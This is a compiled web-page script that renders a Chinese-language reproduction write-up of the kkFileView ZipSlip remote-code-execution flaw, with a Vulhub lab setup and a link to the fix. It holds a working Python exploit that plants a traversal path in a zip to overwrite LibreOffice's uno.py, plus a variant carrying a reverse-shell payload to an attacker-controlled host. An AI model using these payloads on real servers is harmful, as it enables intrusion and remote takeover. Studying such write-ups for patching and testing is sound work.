import{_ as i}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as p,c,a as n,b as a,d as e,e as t}from"./app-58e4a7d6.js";const l={},r=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),u=n("p",null,"kkFileView 是使用 Spring Boot 搭建的文档在线预览解决方案，能够支持多种主流办公文档的在线预览，如 doc、docx、xls、xlsx、ppt、pptx、pdf、txt、zip、rar 等格式。此外，还可以预览图片、视频、音频等多种类型的文件。",-1),d=n("p",null,"在 kkFileView 4.4.0-beta 以前，存在一处 ZipSlip 漏洞。攻击者可以利用该漏洞，向服务器任意目录下写入文件，导致任意命令执行漏洞。",-1),k=n("p",null,"参考链接：",-1),b={href:"https://github.com/kekingcn/kkFileView/issues/553",target:"_blank",rel:"noopener noreferrer"},g={href:"https://github.com/luelueking/kkFileView-v4.3.0-RCE-POC",target:"_blank",rel:"noopener noreferrer"},m=t(`<h2 id="披露时间" tabindex="-1"><a class="header-anchor" href="#披露时间" aria-hidden="true">#</a> 披露时间</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>2024-04-15
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>v4.2.0 &lt;= kkFileView &lt;= v4.4.0-beta
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令启动一个 kkFileView 3.4.0 服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>服务启动后，访问 <code>http://your-ip:8012</code> 即可查看到首页。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240419210738761.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>目标在使用 odt 转 pdf 时会调用系统的 Libreoffice，而该进程会调用库中的 <code>uno.py</code> 文件，因此可以覆盖 <code>uno.py</code> 文件的内容实现 RCE。</p>`,11),h={href:"https://github.com/vulhub/vulhub/blob/master/kkfileview/4.3-zipslip-rce/poc.py",target:"_blank",rel:"noopener noreferrer"},v=t(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> zipfile

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        binary1 <span class="token operator">=</span> <span class="token string">b&#39;vulhub&#39;</span>
        binary2 <span class="token operator">=</span> <span class="token string">b&quot;import os\\nos.system(&#39;touch /tmp/success&#39;)\\n&quot;</span>
        zipFile <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">&quot;test.zip&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span><span class="token punctuation">,</span> zipfile<span class="token punctuation">.</span>ZIP_DEFLATED<span class="token punctuation">)</span>
        <span class="token comment"># info = zipfile.ZipInfo(&quot;test.zip&quot;)</span>
        zipFile<span class="token punctuation">.</span>writestr<span class="token punctuation">(</span><span class="token string">&quot;test&quot;</span><span class="token punctuation">,</span> binary1<span class="token punctuation">)</span>
        zipFile<span class="token punctuation">.</span>writestr<span class="token punctuation">(</span><span class="token string">&quot;../../../../../../../../../../../../../../../../../../../opt/libreoffice7.5/program/uno.py&quot;</span><span class="token punctuation">,</span> binary2<span class="token punctuation">)</span>
        zipFile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> IOError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">raise</span> e
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>执行 <code>poc.py</code>，生成 POC 文件，<code>test.zip</code> 将被写入当前目录。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python poc.py
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>然后，使用 kkFileView 服务上传 <code>test.zip</code>：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240419212103511.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>点击 <code>test.zip</code> 的“预览”按钮，可以看到 zip 压缩包中的文件列表：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240419212029664.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,7),f={href:"https://github.com/vulhub/vulhub/blob/master/kkfileview/4.3-zipslip-rce/sample.odt",target:"_blank",rel:"noopener noreferrer"},_=t(`<figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240419212226172.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>点击 <code>sample.odt</code> 的“预览”按钮，触发代码执行漏洞：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240419212315976.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可见，<code>touch /tmp/success</code> 已经成功被执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240419212427494.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>反弹 shell：</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> zipfile

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        binary1 <span class="token operator">=</span> <span class="token string">b&#39;whoami&#39;</span>
        binary2 <span class="token operator">=</span> <span class="token string">b&#39;import socket,subprocess,os\\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\\ns.connect((&quot;&lt;your-vps-ip&gt;&quot;,8888));os.dup2(s.fileno(),0)\\nos.dup2(s.fileno(),1)\\nos.dup2(s.fileno(),2)\\np=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])\\n&#39;</span>
        zipFile <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">&quot;exp.zip&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span><span class="token punctuation">,</span> zipfile<span class="token punctuation">.</span>ZIP_DEFLATED<span class="token punctuation">)</span>
        zipFile<span class="token punctuation">.</span>writestr<span class="token punctuation">(</span><span class="token string">&quot;test&quot;</span><span class="token punctuation">,</span> binary1<span class="token punctuation">)</span>
        zipFile<span class="token punctuation">.</span>writestr<span class="token punctuation">(</span><span class="token string">&quot;../../../../../../../../../../../../../../../../../../../opt/libreoffice7.5/program/uno.py&quot;</span><span class="token punctuation">,</span> binary2<span class="token punctuation">)</span>
        zipFile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> IOError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">raise</span> e
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240419220258376.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞修复" tabindex="-1"><a class="header-anchor" href="#漏洞修复" aria-hidden="true">#</a> 漏洞修复</h2>`,9),y={href:"https://github.com/kekingcn/kkFileView/commit/421a2760d58ccaba4426b5e104938ca06cc49778",target:"_blank",rel:"noopener noreferrer"};function x(w,z){const s=o("ExternalLinkIcon");return p(),c("div",null,[r,u,d,k,n("ul",null,[n("li",null,[n("a",b,[a("https://github.com/kekingcn/kkFileView/issues/553"),e(s)])]),n("li",null,[n("a",g,[a("https://github.com/luelueking/kkFileView-v4.3.0-RCE-POC"),e(s)])])]),m,n("p",null,[a("首先，修改 "),n("a",h,[a("poc.py"),e(s)]),a("：")]),v,n("p",null,[a("最后，上传任意一个 odt 文件，例如 "),n("a",f,[a("sample.odt"),e(s)]),a("，发起 Libreoffice 任务：")]),_,n("ul",null,[n("li",null,[n("a",y,[a("https://github.com/kekingcn/kkFileView/commit/421a2760d58ccaba4426b5e104938ca06cc49778"),e(s)])])])])}const V=i(l,[["render",x],["__file","kkFileView ZipSlip 远程命令执行漏洞.html.vue"]]);export{V as default};
